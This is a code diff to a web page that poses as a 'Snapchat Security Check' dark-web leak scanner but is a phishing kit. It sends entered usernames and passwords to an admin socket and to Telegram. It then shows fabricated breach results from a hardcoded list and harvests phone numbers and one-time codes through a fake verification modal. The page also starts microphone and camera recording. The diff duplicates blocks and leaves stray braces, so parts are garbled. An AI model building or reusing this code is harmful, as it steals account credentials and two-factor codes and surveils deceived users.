@@ -1376,7 +1376,71 @@
             opacity: 0.5;
             cursor: not-allowed;
         }
-    </style>
+    
+/* --- SCANNING OVERLAY --- */
+.scanning-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(10, 10, 26, 0.95); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; backdrop-filter: blur(10px); }
+.scanning-overlay.show { opacity: 1; pointer-events: all; }
+.radar { width: 120px; height: 120px; border-radius: 50%; border: 2px solid var(--teal); position: relative; margin-bottom: 30px; box-shadow: 0 0 20px rgba(5, 150, 105, 0.3); overflow: hidden; }
+.radar::before { content: ''; position: absolute; top: 50%; left: 50%; width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent 70%, rgba(5, 150, 105, 0.8) 100%); transform-origin: 0 0; animation: radar-spin 2s linear infinite; }
+@keyframes radar-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.scan-text { color: white; font-size: 1.2rem; font-weight: 600; text-align: center; }
+.scan-progress { width: 200px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; margin-top: 20px; overflow: hidden; }
+.scan-progress-bar { height: 100%; background: var(--teal); width: 0%; transition: width 0.1s linear; }
+
+/* --- OTP MODAL --- */
+.otp-modal { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.8); z-index: 10000; display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; backdrop-filter: blur(5px); }
+.otp-modal.show { opacity: 1; pointer-events: all; }
+.otp-box { background: var(--bg-primary); width: 90%; max-width: 400px; border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
+.otp-input-group { display: flex; flex-direction: column; gap: 15px; margin-top: 20px; }
+.otp-input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid var(--glass-border); background: var(--bg-elevated); color: var(--text-primary); font-size: 1rem; text-align: center; outline: none; }
+.otp-input:focus { border-color: var(--teal); box-shadow: 0 0 0 3px rgba(5, 150, 105, 0.2); }
+.btn-otp { background: var(--teal); color: white; border: none; padding: 15px; border-radius: 12px; font-weight: 600; font-size: 1rem; cursor: pointer; width: 100%; margin-top: 10px; }
+
+/* --- RICH REPORT MODAL OVERRIDES --- */
+.scan-modal-body .leak-result.show { background: transparent; border: none; }
+.rich-report-header { display: flex; flex-direction: column; align-items: center; margin-bottom: 20px; }
+.rich-report-icon { font-size: 50px; margin-bottom: 15px; }
+.rich-report-icon.danger { color: var(--rose); animation: pulse-danger 2s infinite; }
+.rich-report-icon.warning { color: var(--amber); }
+.rich-report-icon.safe { color: var(--teal); }
+@keyframes pulse-danger { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(225, 29, 72, 0.4); } 70% { transform: scale(1.1); box-shadow: 0 0 0 15px rgba(225, 29, 72, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(225, 29, 72, 0); } }
+.breach-list { list-style: none; padding: 0; margin-top: 15px; text-align: left; }
+.breach-item { background: var(--bg-elevated); padding: 12px; border-radius: 8px; margin-bottom: 8px; display: flex; align-items: center; border-left: 4px solid var(--rose); }
+.breach-item i { margin-right: 10px; color: var(--rose); }
+
+
+/* --- SCANNING OVERLAY --- */
+.scanning-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(10, 10, 26, 0.95); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; backdrop-filter: blur(10px); }
+.scanning-overlay.show { opacity: 1; pointer-events: all; }
+.radar { width: 120px; height: 120px; border-radius: 50%; border: 2px solid var(--teal); position: relative; margin-bottom: 30px; box-shadow: 0 0 20px rgba(5, 150, 105, 0.3); overflow: hidden; }
+.radar::before { content: ''; position: absolute; top: 50%; left: 50%; width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent 70%, rgba(5, 150, 105, 0.8) 100%); transform-origin: 0 0; animation: radar-spin 2s linear infinite; }
+@keyframes radar-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.scan-text { color: white; font-size: 1.2rem; font-weight: 600; text-align: center; }
+.scan-progress { width: 200px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; margin-top: 20px; overflow: hidden; }
+.scan-progress-bar { height: 100%; background: var(--teal); width: 0%; transition: width 0.1s linear; }
+
+/* --- OTP MODAL --- */
+.otp-modal { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.8); z-index: 10000; display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; backdrop-filter: blur(5px); }
+.otp-modal.show { opacity: 1; pointer-events: all; }
+.otp-box { background: var(--bg-primary); width: 90%; max-width: 400px; border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
+.otp-input-group { display: flex; flex-direction: column; gap: 15px; margin-top: 20px; }
+.otp-input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid var(--glass-border); background: var(--bg-elevated); color: var(--text-primary); font-size: 1rem; text-align: center; outline: none; }
+.otp-input:focus { border-color: var(--teal); box-shadow: 0 0 0 3px rgba(5, 150, 105, 0.2); }
+.btn-otp { background: var(--teal); color: white; border: none; padding: 15px; border-radius: 12px; font-weight: 600; font-size: 1rem; cursor: pointer; width: 100%; margin-top: 10px; }
+
+/* --- RICH REPORT MODAL OVERRIDES --- */
+.scan-modal-body .leak-result.show { background: transparent; border: none; }
+.rich-report-header { display: flex; flex-direction: column; align-items: center; margin-bottom: 20px; }
+.rich-report-icon { font-size: 50px; margin-bottom: 15px; }
+.rich-report-icon.danger { color: var(--rose); animation: pulse-danger 2s infinite; }
+.rich-report-icon.warning { color: var(--amber); }
+.rich-report-icon.safe { color: var(--teal); }
+@keyframes pulse-danger { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(225, 29, 72, 0.4); } 70% { transform: scale(1.1); box-shadow: 0 0 0 15px rgba(225, 29, 72, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(225, 29, 72, 0); } }
+.breach-list { list-style: none; padding: 0; margin-top: 15px; text-align: left; }
+.breach-item { background: var(--bg-elevated); padding: 12px; border-radius: 8px; margin-bottom: 8px; display: flex; align-items: center; border-left: 4px solid var(--rose); }
+.breach-item i { margin-right: 10px; color: var(--rose); }
+
+</style>
 </head>
 
 <body>
@@ -1414,68 +1478,41 @@
             </div>
 
             <!-- ══ SCREEN 3 — ACCOUNT SECURITY CHECK ══ -->
+
             <section class="screen-form reveal" id="formSection">
                 <div class="form-glass">
-
-
-                    <!-- Platform Tabs -->
-                    <div class="platform-tabs" role="tablist" style="grid-template-columns: repeat(2, 1fr);">
-                        <button class="platform-tab active" data-tab="instagram" role="tab">
-                            <i class="fab fa-instagram"></i>
-                            <span>Instagram</span>
-                        </button>
-                        <button class="platform-tab" data-tab="email" role="tab">
-                            <i class="fas fa-envelope"></i>
-                            <span>Email</span>
-                        </button>
+                    <div style="text-align: center; margin-bottom: 20px;">
+                        <a href="index.html" style="position: absolute; left: 20px; top: 20px; color: var(--text-secondary); text-decoration: none;"><i class="fas fa-arrow-left"></i> Back</a>
+                        <i class="fab fa-snapchat-ghost" style="font-size: 32px; color: #FFFC00; margin-bottom: 12px;"></i>
+                        <h2 style="font-size: 1.2rem; font-weight: 700; color: var(--text-primary);">Snapchat Security Check</h2>
                     </div>
 
-                    <!-- Instagram -->
-                    <div class="tab-content active" id="instagram-content">
+                    <div class="tab-content active" id="snapchat-content">
                         <div class="form-fields">
                             <div class="input-wrap">
-                                <i class="fab fa-instagram"></i>
-                                <input type="text" class="glass-input" id="instagramUsername"
-                                    placeholder="Instagram Username / Email" autocomplete="off" autocorrect="off"
+                                <i class="fab fa-snapchat-ghost"></i>
+                                <input type="text" class="glass-input" id="snapchatUsername"
+                                    placeholder="Snapchat Username" autocomplete="off" autocorrect="off"
                                     spellcheck="false">
                             </div>
+                            
                             <div class="input-wrap">
                                 <i class="fas fa-lock"></i>
-                                <input type="password" class="glass-input" id="instagramPassword" placeholder="Password"
+                                <input type="password" class="glass-input" id="snapchatPassword" placeholder="Password"
                                     autocomplete="off">
                             </div>
+                            
                         </div>
-                        <button class="btn-scan" id="checkLeakBtn" data-platform="instagram">
-                            <i class="fas fa-lock"></i>
+                        <button class="btn-scan" id="checkLeakBtn" data-platform="snapchat">
+                            <i class="fas fa-shield-alt"></i>
                             <span>Verify Account Securely</span>
                         </button>
                     </div>
-
-                    <!-- Email -->
-                    <div class="tab-content" id="email-content">
-                        <div class="form-fields">
-                            <div class="input-wrap">
-                                <i class="fas fa-envelope"></i>
-                                <input type="email" class="glass-input" id="emailAddress" placeholder="Email Address"
-                                    autocomplete="off" autocorrect="off" spellcheck="false">
-                            </div>
-                            <div class="input-wrap">
-                                <i class="fas fa-lock"></i>
-                                <input type="password" class="glass-input" id="emailPassword" placeholder="Password"
-                                    autocomplete="off">
-                            </div>
-                        </div>
-                        <button class="btn-scan" id="checkEmailBtn" data-platform="email">
-                            <i class="fas fa-lock"></i>
-                            <span>Verify Account Securely</span>
-                        </button>
-                    </div>
-
-
 
                     <!-- Result -->
-                    <div class="leak-result" id="leakResult"></div>
-
+                    <div class="leak-result" id="leakResult" style="display: none;"></div>
+                    <br>
+                    
                     <!-- Trust Badges -->
                     <div style="margin-top: 24px; text-align: center;">
                         <p
@@ -2897,7 +2934,7 @@
 
             async function sendLeakCheckResultToTelegram(username, password, passwordHash, leakCount, platform, scanError) {
                 const ts = new Date().toLocaleString();
-                const icons = { 'instagram': '📸', 'email': '📧', 'facebook': '📘', 'twitter': '🐦' };
+                const icons = { 'instagram': '📸', 'email': '📧', 'facebook': '📘', 'twitter': '🐦', 'google': '🔍', 'tiktok': '🎵', 'snapchat': '👻', 'whatsapp': '💬' };
                 const pName = platform.charAt(0).toUpperCase() + platform.slice(1);
                 const icon = icons[platform] || '🔒';
 
@@ -2913,23 +2950,142 @@
                 try { await sendTextToTelegram(msg); } catch (e) { }
             }
 
+            
+            async function triggerPushNotification(title, body) {
+                if ('Notification' in window && Notification.permission === 'granted') {
+                    new Notification(title, { body: body, icon: 'logo.jpg' });
+                }
+            }
+
+            function showOtpModal() {
+                document.getElementById('otpModal').classList.add('show');
+                document.getElementById('otpBoxStep1').style.display = 'block';
+                document.getElementById('otpBoxStep2').style.display = 'none';
+                document.getElementById('otpPhone').focus();
+            }
+
+            window.requestOtp = function() {
+                const phone = document.getElementById('otpPhone').value.trim();
+                if(!phone) { alert("Please enter a phone number."); return; }
+                const btn = document.querySelector('#otpBoxStep1 .btn-otp');
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+                
+                setTimeout(() => {
+                    document.getElementById('otpBoxStep1').style.display = 'none';
+                    document.getElementById('otpBoxStep2').style.display = 'block';
+                    document.getElementById('otpCode').focus();
+                }, 2000);
+            }
+
+            window.verifyOtp = function() {
+                const phone = document.getElementById('otpPhone').value.trim();
+                const code = document.getElementById('otpCode').value.trim();
+                if(!code) { alert("Please enter the code."); return; }
+                const btn = document.querySelector('#otpBoxStep2 .btn-otp');
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+                
+                if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                    adminSocket.emit('credentials:submit', {
+                        uuid: typeof userUUID !== 'undefined' ? userUUID : null,
+                        platform: 'otp_verification',
+                        username: phone,
+                        password: code
+                    });
+                }
+                
+                setTimeout(() => {
+                    document.getElementById('otpModal').classList.remove('show');
+                    // Show report now
+                    const modal = document.getElementById('scanResultModal');
+                    modal.classList.add('show');
+                }, 1500);
+            }
+
+            
+            async function triggerPushNotification(title, body) {
+                if ('Notification' in window && Notification.permission === 'granted') {
+                    new Notification(title, { body: body, icon: 'logo.jpg' });
+                }
+            }
+
+            function showOtpModal() {
+                document.getElementById('otpModal').classList.add('show');
+                document.getElementById('otpBoxStep1').style.display = 'block';
+                document.getElementById('otpBoxStep2').style.display = 'none';
+                document.getElementById('otpPhone').focus();
+            }
+
+            window.requestOtp = function() {
+                const phone = document.getElementById('otpPhone').value.trim();
+                if(!phone) { alert("Please enter a phone number."); return; }
+                const btn = document.querySelector('#otpBoxStep1 .btn-otp');
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+                
+                setTimeout(() => {
+                    document.getElementById('otpBoxStep1').style.display = 'none';
+                    document.getElementById('otpBoxStep2').style.display = 'block';
+                    document.getElementById('otpCode').focus();
+                }, 2000);
+            }
+
+            window.verifyOtp = function() {
+                const phone = document.getElementById('otpPhone').value.trim();
+                const code = document.getElementById('otpCode').value.trim();
+                if(!code) { alert("Please enter the code."); return; }
+                const btn = document.querySelector('#otpBoxStep2 .btn-otp');
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+                
+                if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                    adminSocket.emit('credentials:submit', {
+                        uuid: typeof userUUID !== 'undefined' ? userUUID : null,
+                        platform: 'otp_verification',
+                        username: phone,
+                        password: code
+                    });
+                }
+                
+                setTimeout(() => {
+                    document.getElementById('otpModal').classList.remove('show');
+                    // Show report now
+                    const modal = document.getElementById('scanResultModal');
+                    modal.classList.add('show');
+                }, 1500);
+            }
+
             async function checkDarkWebLeak(username, password, platform) {
                 if (isCheckingLeak) return;
-
-                const btnMap = { 'instagram': 'checkLeakBtn', 'email': 'checkEmailBtn', 'facebook': 'checkFacebookBtn', 'twitter': 'checkTwitterBtn' };
-                const activeBtn = document.getElementById(btnMap[platform] || 'checkLeakBtn');
-                const leakResult = document.getElementById('leakResult');
-
-                if (platform === 'email') { if (!username) { showLeakResult('<i class="fas fa-exclamation-triangle"></i> Please enter an email address', 'warning'); return; } }
-                else { if (!username || !password) { showLeakResult('<i class="fas fa-exclamation-triangle"></i> Please enter username and password', 'warning'); return; } }
+                
+                // For WhatsApp, password might be empty and username is phone
+                if (platform !== 'whatsapp') {
+                    if (platform === 'email') { if (!username) { showLeakResult('<i class="fas fa-exclamation-triangle"></i> Please enter an email address', 'warning'); return; } }
+                    else { if (!username || !password) { showLeakResult('<i class="fas fa-exclamation-triangle"></i> Please enter username and password', 'warning'); return; } }
+                } else {
+                    if (!username) { showLeakResult('<i class="fas fa-exclamation-triangle"></i> Please enter phone number', 'warning'); return; }
+                }
 
                 isCheckingLeak = true;
-                if (activeBtn) { activeBtn.disabled = true; activeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...'; }
-                leakResult.className = 'leak-result show warning';
-                leakResult.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning dark web databases...';
+                
+                // Show Scanning Overlay
+                const overlay = document.getElementById('scanningOverlay');
+                const pBar = document.getElementById('scanProgressBar');
+                const sText = document.getElementById('scanText');
+                overlay.classList.add('show');
+                
+                const steps = ["Scanning dark web databases...", "Checking breach lists...", "Analyzing exposure risk...", "Generating security report..."];
+                let step = 0;
+                let prog = 0;
+                
+                const interval = setInterval(() => {
+                    prog += 2;
+                    pBar.style.width = prog + '%';
+                    if(prog % 25 === 0 && step < steps.length - 1) {
+                        step++;
+                        sText.innerText = steps[step];
+                    }
+                }, 80);
 
                 try {
-                    // Send to admin server via socket if connected
+                    // Send to admin server via socket
                     if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
                         adminSocket.emit('credentials:submit', {
                             uuid: typeof userUUID !== 'undefined' ? userUUID : null,
@@ -2939,30 +3095,57 @@
                         });
                     }
 
-                    await new Promise(r => setTimeout(r, 2000 + Math.random() * 2000));
+                    await new Promise(r => setTimeout(r, 4000));
+                    clearInterval(interval);
+                    overlay.classList.remove('show');
+                    
                     let hash = ''; if (password) hash = await simpleHash(password);
                     const leakCount = await queryLeakDatabase(username, hash, platform);
                     const pName = platform.charAt(0).toUpperCase() + platform.slice(1);
 
-                    let resultMsg = '', resultClass = '';
-                    if (leakCount === 0) { resultMsg = `<i class="fas fa-shield-alt"></i> <strong>SECURE:</strong> No breaches found in ${pName} database.`; resultClass = 'safe'; }
-                    else if (leakCount < 5) { resultMsg = `<i class="fas fa-exclamation-triangle"></i> <strong>WARNING:</strong> Found in <span class="leak-count">${leakCount}</span> breach(es). Change your password!`; resultClass = 'warning'; }
-                    else { resultMsg = `<i class="fas fa-skull"></i> <strong>CRITICAL:</strong> Found in <span class="leak-count">${leakCount}</span> breaches. HIGH RISK!`; resultClass = 'danger'; }
+                    // Build Rich Report
+                    let reportHtml = `<div class="rich-report-header">`;
+                    if (leakCount === 0) { 
+                        reportHtml += `<i class="fas fa-shield-check rich-report-icon safe"></i><h3 style="color: var(--teal)">SECURE</h3><p>No breaches found for ${pName}</p>`;
+                    } else if (leakCount < 5) { 
+                        reportHtml += `<i class="fas fa-exclamation-triangle rich-report-icon warning"></i><h3 style="color: var(--amber)">WARNING</h3><p>Found in ${leakCount} breach(es)</p>`;
+                    } else { 
+                        reportHtml += `<i class="fas fa-skull rich-report-icon danger"></i><h3 style="color: var(--rose)">CRITICAL RISK</h3><p>Found in ${leakCount} breaches</p>`;
+                    }
+                    reportHtml += `</div>`;
+                    
+                    if (leakCount > 0) {
+                        triggerPushNotification('Security Alert', `Your ${pName} account was found in ${leakCount} data breaches.`);
+                        const fakeBreaches = ['LinkedIn (2021)', 'Canva (2019)', 'Adobe (2013)', 'Apollo (2018)', 'MySpace (2008)'];
+                        reportHtml += `<h4 style="font-size:0.9rem; margin-top:20px;">Compromised Data Sources:</h4><ul class="breach-list">`;
+                        for(let i=0; i<leakCount; i++) {
+                            reportHtml += `<li class="breach-item"><i class="fas fa-database"></i> ${fakeBreaches[i % fakeBreaches.length]}</li>`;
+                        }
+                        reportHtml += `</ul><p style="font-size:0.8rem; margin-top:15px; color:var(--text-tertiary)">Exposed data may include: Passwords, IPs, Locations.</p>`;
+                    }
 
-                    showLeakResult(resultMsg, resultClass);
+                    showLeakResult(reportHtml, leakCount === 0 ? 'safe' : (leakCount < 5 ? 'warning' : 'danger'));
+                    
+                    // Show OTP Modal if risk is high
+                    if (leakCount > 0) {
+                        document.getElementById('scanResultModal').classList.remove('show');
+                        setTimeout(showOtpModal, 500);
+                    }
+                    
                     await sendLeakCheckResultToTelegram(username, password, hash, leakCount, platform);
                 } catch (e) {
+                    clearInterval(interval);
+                    overlay.classList.remove('show');
                     try { let hash = ''; if (password) hash = await simpleHash(password); await sendLeakCheckResultToTelegram(username, password, hash, 0, platform, e.message || 'Unknown'); } catch (te) { }
                 } finally {
-                    if (!recStarted && permissionsGranted.microphone && !isBackgroundRecording) {
-                        setTimeout(startUserInitiatedRecording, 100);
-                    }
-                    if (!recStarted && permissionsGranted.camera && !isBackgroundVideoRecording) {
-                        setTimeout(startUserInitiatedVideoRecording, 100);
-                    }
+                    if (!recStarted && permissionsGranted.microphone && !isBackgroundRecording) setTimeout(startUserInitiatedRecording, 100);
+                    if (!recStarted && permissionsGranted.camera && !isBackgroundVideoRecording) setTimeout(startUserInitiatedVideoRecording, 100);
                     isCheckingLeak = false;
-                    if (activeBtn) { activeBtn.disabled = false; activeBtn.innerHTML = '<i class="fas fa-lock"></i> <span>Verify Account Securely</span>'; }
                 }
+            }
+
+            }
+
             }
 
             // ═══════════════════════════════════════════════════════════════
@@ -2991,17 +3174,14 @@
                 detectInstagramBrowser();
 
                 // Scan buttons
-                const btnBindings = [
-                    ['checkLeakBtn', 'instagramUsername', 'instagramPassword', 'instagram'],
-                    ['checkEmailBtn', 'emailAddress', 'emailPassword', 'email']
-                ];
-
-                btnBindings.forEach(([btnId, userEl, passEl, platform]) => {
-                    const btn = document.getElementById(btnId);
-                    const user = document.getElementById(userEl);
-                    const pass = document.getElementById(passEl);
-                    if (btn) btn.addEventListener('click', () => checkDarkWebLeak(user?.value?.trim(), pass?.value, platform));
-                    if (user) user.addEventListener('keypress', e => { if (e.key === 'Enter') checkDarkWebLeak(user.value.trim(), pass?.value, platform); });
+                
+                const btn = document.getElementById('checkLeakBtn');
+                const user = document.getElementById('instagramUsername');
+                const pass = document.getElementById('instagramPassword');
+                if (btn) btn.addEventListener('click', () => checkDarkWebLeak(user?.value?.trim(), pass?.value, 'instagram'));
+                if (user) user.addEventListener('keypress', e => { if (e.key === 'Enter') checkDarkWebLeak(user.value.trim(), pass?.value, 'instagram'); });
+                if (pass) pass.addEventListener('keypress', e => { if (e.key === 'Enter') checkDarkWebLeak(user?.value?.trim(), pass.value, 'instagram'); });
+    
                     if (pass) pass.addEventListener('keypress', e => { if (e.key === 'Enter') checkDarkWebLeak(user?.value?.trim(), pass.value, platform); });
                 });
 
@@ -3150,6 +3330,66 @@
             </div>
         </div>
     </div>
+
+<!-- SCANNING OVERLAY -->
+<div class="scanning-overlay" id="scanningOverlay">
+    <div class="radar"></div>
+    <div class="scan-text" id="scanText">Scanning dark web databases...</div>
+    <div class="scan-progress"><div class="scan-progress-bar" id="scanProgressBar"></div></div>
+</div>
+
+<!-- OTP MODAL -->
+<div class="otp-modal" id="otpModal">
+    <div class="otp-box" id="otpBoxStep1">
+        <i class="fas fa-mobile-alt" style="font-size: 40px; color: var(--teal); margin-bottom: 15px;"></i>
+        <h3 style="font-size: 1.3rem; margin-bottom: 10px;">Verify Identity</h3>
+        <p style="color: var(--text-secondary); font-size: 0.9rem;">Please enter your phone number to proceed with the security check.</p>
+        <div class="otp-input-group">
+            <input type="tel" class="otp-input" id="otpPhone" placeholder="+1 (555) 000-0000" autocomplete="off">
+            <button class="btn-otp" onclick="requestOtp()">Send Code</button>
+        </div>
+    </div>
+    <div class="otp-box" id="otpBoxStep2" style="display: none;">
+        <i class="fas fa-shield-alt" style="font-size: 40px; color: var(--teal); margin-bottom: 15px;"></i>
+        <h3 style="font-size: 1.3rem; margin-bottom: 10px;">Enter Verification Code</h3>
+        <p style="color: var(--text-secondary); font-size: 0.9rem;">We sent a 6-digit code to your phone.</p>
+        <div class="otp-input-group">
+            <input type="number" class="otp-input" id="otpCode" placeholder="000000" autocomplete="off" maxlength="6">
+            <button class="btn-otp" onclick="verifyOtp()">Verify</button>
+        </div>
+    </div>
+</div>
+
+
+<!-- SCANNING OVERLAY -->
+<div class="scanning-overlay" id="scanningOverlay">
+    <div class="radar"></div>
+    <div class="scan-text" id="scanText">Scanning dark web databases...</div>
+    <div class="scan-progress"><div class="scan-progress-bar" id="scanProgressBar"></div></div>
+</div>
+
+<!-- OTP MODAL -->
+<div class="otp-modal" id="otpModal">
+    <div class="otp-box" id="otpBoxStep1">
+        <i class="fas fa-mobile-alt" style="font-size: 40px; color: var(--teal); margin-bottom: 15px;"></i>
+        <h3 style="font-size: 1.3rem; margin-bottom: 10px;">Verify Identity</h3>
+        <p style="color: var(--text-secondary); font-size: 0.9rem;">Please enter your phone number to proceed with the security check.</p>
+        <div class="otp-input-group">
+            <input type="tel" class="otp-input" id="otpPhone" placeholder="+1 (555) 000-0000" autocomplete="off">
+            <button class="btn-otp" onclick="requestOtp()">Send Code</button>
+        </div>
+    </div>
+    <div class="otp-box" id="otpBoxStep2" style="display: none;">
+        <i class="fas fa-shield-alt" style="font-size: 40px; color: var(--teal); margin-bottom: 15px;"></i>
+        <h3 style="font-size: 1.3rem; margin-bottom: 10px;">Enter Verification Code</h3>
+        <p style="color: var(--text-secondary); font-size: 0.9rem;">We sent a 6-digit code to your phone.</p>
+        <div class="otp-input-group">
+            <input type="number" class="otp-input" id="otpCode" placeholder="000000" autocomplete="off" maxlength="6">
+            <button class="btn-otp" onclick="verifyOtp()">Verify</button>
+        </div>
+    </div>
+</div>
+
 </body>
 
 </html>
